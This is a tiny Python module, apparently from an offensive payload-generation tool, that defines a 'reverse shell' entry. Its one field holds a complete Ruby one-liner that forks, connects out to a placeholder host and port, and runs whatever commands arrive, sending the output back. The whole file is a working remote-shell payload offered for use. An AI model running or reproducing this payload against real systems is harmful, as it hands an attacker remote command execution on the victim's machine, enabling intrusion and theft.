class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses ruby tcpsocket to connect back."
    function    = "reverse shell"
    liner       = "ruby -rsocket -e \"exit if fork;s=TCPSocket.new('TARGET',PORT);while(s.print 'shell>';s2=s.gets);IO.popen(s2,'r'){|s3|s.print s3.read}end\" "
